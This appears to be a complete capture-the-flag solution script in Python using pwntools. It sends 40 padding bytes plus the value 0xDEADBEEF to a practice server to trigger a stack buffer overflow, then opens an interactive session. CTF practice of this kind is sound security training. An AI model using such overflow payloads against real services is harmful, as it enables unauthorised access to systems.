from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3000)

r.sendline("a"*40+"\xEF\xBE\xAD\xDE")
r.interactive()